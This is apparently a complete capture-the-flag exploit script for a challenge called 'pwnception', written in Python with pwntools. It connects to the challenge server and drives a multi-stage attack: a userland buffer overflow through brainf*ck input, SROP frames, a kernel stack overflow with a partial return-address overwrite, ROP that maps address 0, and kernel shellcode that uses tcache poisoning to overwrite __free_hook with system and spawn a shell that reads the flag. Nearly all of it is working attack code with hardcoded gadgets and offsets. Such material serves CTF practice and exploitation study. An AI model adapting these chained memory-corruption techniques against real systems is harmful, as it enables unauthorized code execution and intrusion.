#!/usr/bin/env python3

from pwn import *

context.bits = 64
context.arch = "amd64"

#p = process("./userland")
#p = process(["./main", "./kernel", "./userland"])
#p = remote("localhost", 1337)
p = remote("pwnception.chal.perfect.blue", 1)

#gdb.attach(p)

# Userland gadgets and addresses
main = 0x4005f1
syscall_ret = 0x400cf2
pop_rax = 0x400121
xchg_rdi_rax = 0x4009d3
pop_4 = 0x400af3 # pop rbx, rbp, r12, r13 ; ret
mov_2_call = 0x4008bd # mov rdx, r12 ; mov rsi, rbx ; call r13
userland_ret_addr = 0x7fffffffdfa8 # Always constant in the emulator

# Kernel gadgets and addresses
kern_base = 0xffffffff81000000
int_0x70 = 0xffffffff810001db # int 0x70 ; ret
read_gadget = 0xffffffff8100008c # mov rcx, rsi; mov dx, 0x38f; rep insb; ret

# This address is mapped in both the kernel and the userland, so we use this
# to store any input that needs to be shared between them
shared_buf = 0x7fffffeff000

# SigReturn Oriented Programming
# `srop_idx` is the current srop frame's index. The index starts at 1 for the
# first frame, and increases by 1 for every subsequent frame. It lets us set
# RSP to right after each frame so we can continue ropping as needed
def srop(syscall, rip, arg1, arg2, arg3, srop_idx):
    # Set up frame
    frame = SigreturnFrame()
    frame.rax = syscall
    frame.rdi = arg1
    frame.rsi = arg2
    frame.rdx = arg3

    # Our final sropchain will be 3 * 8 bytes + len(frame), so we set RSP to
    # After this, so that the next `ret` instruction will return into our new
    # input that is after the frame
    frame.rsp = userland_ret_addr + srop_idx * len(frame) + 0x18
    frame.rip = rip

    return frame

# Convert a ropchain into bf code
# +[,>,] is used to loop and overwrite past the return address, so we just have
# to write each byte followed by a non-null byte to continue looping.
# We end our loop when we're finished by inserting two null bytes which stops 
# the loop.
def bf_rop(ropchain):
    final = b""

    for byte in ropchain:
        final += bytes([byte]) + b"\x01"

    return final

# Prepare our kernel shellcode.
# This will be used to pwn the emulator binary.
# int 0x71 lets us malloc, free, read, and write into a chunk at will. The
# allocations all happen in the actual emulator binary, which lets us pwn it
# in order to get a shell. The libc is 2.27 so we can just do tcache poisoning.
#
# We just malloc a 0x20 chunk, free it to get libunicorn leak, tcache dup to
# get a GOT leak from libunicorn, calculate free hook in libc, tcache dup to
# overwrite free hook with system, and then get shell
kshellcode = asm(r"""
;// macro to call malloc in the emulator
#define malloc(size)\
mov rax, 0;\
mov rdi, size;\
int 0x71;

;// macro to call free in the emulator
#define free()\
mov rax, 3;\
int 0x71;

;// macro to read from the currently allocated chunk into `addr`
#define read(addr, size)\
mov rax, 2;\
mov rdi, addr;\
mov rsi, size;\
int 0x71;

;// macro to write the contents of `addr` into the currently allocated chunk
#define write(addr, size)\
mov rax, 1;\
mov rdi, addr;\
mov rsi, size;\
int 0x71;

;// allocate 0x20, free, and store 0x100 bytes of the freed chunk contents
;// into shared_buf+0x1000
malloc(0x20)
free()
mov r14, 0x7ffffff00000
read(r14, 0x100)

;// There's a libunicorn function address at chunk+0x88, use that to find
;// libunicorn base, and subsequently the GOT
mov r14, 0x7ffffff00000+0x88
mov r15, [r14]
sub r15, 0x1b406 ;// constant offset to libunicorn base
add r15, 0x2ff000 ;// constant offset to libunicorn GOT
add r15, 0x70 ;// constant offset to vasprintf@GOT
mov r14, 0x7ffffff00000
mov [r14], r15

;// Allocate a 0x50 chunk after our 0x20 chunk, free it
malloc(0x50)
free()

;// Modify the freed FD to vasprintf@GOT
write(r14, 8)

;// Malloc twice to get the chunk on vasprintf@GOT
malloc(0x50)
malloc(0x50)

;// Read leaked vasprintf@GOT
mov r14, 0x7ffffff00200
read(r14, 8)

;// Calculate address of __free_hook and system
mov r15, [r14]
sub r15, 0x885c0
add r15, 0x3ed8e8
mov [r14], r15 ;// Store &__free_hook
sub r15, 0x3ed8e8
add r15, 0x4f550
mov [r14+8], r15 ;// Store &system

;// Tcache dup again to free hook, overwrite it with &system
malloc(0x70)
free()
write(r14, 8)
malloc(0x70)
malloc(0x70)
add r14, 8
write(r14, 8)

;// Finally, get shell
malloc(0x80)
lea r11, [rip+bin_sh]
write(r11, 8)
free()

bin_sh:
.asciz "/bin/sh"
recv_until:
.asciz "special_string\n"
""")

# The following code is used for debugging the shellcode above
# You can use it to print out stuff from the kernel memory space to stdout
'''
lea rsi, [rip+recv_until]
mov rcx, 15
mov dx, 0x38f
rep outsb

mov rsi, 0x7ffffff00000
mov rcx, 0x100
rep outsb
'''

# Prepare our initial kernel ropchain.
# For this one, you can't have any null bytes as the bof stops on a null byte.
# We know that when sys_open returns, RSI will be set to 0x38f, and RDI will be
# set to the filename buffer on the kernel stack. This gadget will read RSI
# bytes into the address in RDI (with no restrictions as it uses `read`), which
# subsequently lets us re-trigger the kernel bof and ROP at will
krop1 = flat([
    b"\x82"*0x48, # Pad to kernel stack ret addr
    b"\x8c", # Partial overwrite to read gadget (see gadget above)
])

# Prepare our actual kernel ropchain.
# We're able to use userland addresses because those addresses have been
# mapped into the kernel in the kernel thread handler.
#
# The plan is to set rdi to 0, rsi to 0x1000, rdx to 7, rax to 9, and then
# trigger int 0x70. This will go into the kernel interrupt handler and then
# trigger a `uc_mem_map` call, which will map addr 0 in the kernel for us.
# Then we will use our read gadget to read shellcode into addr 0.
#
# Note that we can't actually use a syscall gadget here because it makes no
# sense for the kernel itself to do a syscall.
krop2 = flat([
    # Map address 0
    b"\x83"*0x50, # Pad to kernel stack ret addr + 8, krop1 returns here
    pop_rax, 0, # We will set rdi to 0 next
    xchg_rdi_rax, # Not actually an xchg gadget, but semantically the same
    pop_4, 0x1000, 0, 7, pop_rax, # Pop rbx, rbp, r12, r13
    mov_2_call, # mov rdx, r12 ; mov rsi, rbx ; call r13
    pop_rax, 9, # Put 9 into rax for mmap
    int_0x70, # Trigger call to uc_mem_map through IRQ 0x70

    # Read shellcode into address 0 using the read gadget
    pop_rax, 0, # Prepare to set RDI to 0
    xchg_rdi_rax,
    pop_4, len(kshellcode), 0, 0, pop_rax,
    mov_2_call, # rsi = len(shellcode)
    read_gadget, # Read into address 0
    0,# Jump to address 0
]).ljust(0x38f, b"\x00") # Pad to 0x38f to end the initial read gadget

# Userland: loop until p_data_ptr points to return address
bf  = b"+[>,]" # Skip until right before canary
bf += b">"*0x12 # Skip past canary and saved rbp
bf += b"+[,>,]" # Start overwriting return address
bf += b"!"
bf += b"\x01"*(4101) + b"\x00" # Enough 0x1 bytes to get to ret addr, then stop

# Now starts our ropchain in userland.
# First we read a big filename into the shared buffer. This will trigger the
# bof in sys_open in the kernel
frame1 = srop(0, syscall_ret, 0, shared_buf, len(krop1), 1)
urop1  = flat([pop_rax, 0xf, syscall_ret, frame1])

# Next we trigger the bof in the kernel by calling sys_open
frame2 = srop(2, syscall_ret, shared_buf, 0, 7, 2)
urop2  = flat([pop_rax, 0xf, syscall_ret, frame2])

bf += bf_rop(urop1) # Read filename into the shared buffer
bf += bf_rop(urop2) # Trigger sys_open bof
bf += b"\x00"*2 # Two null bytes stops our userland bof loop

p.sendafter("!): ", bf)
p.send(krop1) # Partial overwrite kernel ret addr to read gadget
p.send(krop2) # Fully ROP on the kernel, mmap addr 0, read shellcode there
p.send(kshellcode) # Shellcode goes into addr 0, execution jumps to shellcode

p.recv()
p.sendline("cat /flag*")

p.interactive() # pwned
